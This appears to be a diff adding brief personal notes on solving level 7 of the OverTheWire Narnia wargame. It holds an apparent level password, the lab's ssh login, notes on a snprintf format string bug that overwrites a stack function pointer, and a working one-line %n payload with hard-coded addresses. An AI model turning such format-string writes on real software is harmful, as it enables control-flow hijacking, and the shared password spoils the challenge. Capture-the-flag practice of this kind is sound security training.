@@ -1,0 +1,9 @@
+ahkiaziphu
+ssh narnia7@narnia.labs.overthewire.org -p 2226
+[snprinft again!]
+[but in difference to the previous time we exploited that, a function pointer is pushed
+to the stack between the buffer and the snprintf call]
+[the way to exploit that is to first print the addresses that we want to change into the buffer]
+[then we can print the stuff that is above the buffer into the buffer as well]
+[by using offsets, always printing the lowest byte and then moving one up, we can edit whatever byte we want to]
+./narnia7 $(python -c 'print "\x22\xd5\xff\xff\x28\xd5\xff\xff\x29\xd5\xff\xff\x2a\xd5\xff\xff\x2b\xd5\xff\xff" + "%p%n" + "A"*7 + "%n" + "A"*99 + "%n" + "A"*125 + "%n" + "A"*4 + "%n"')
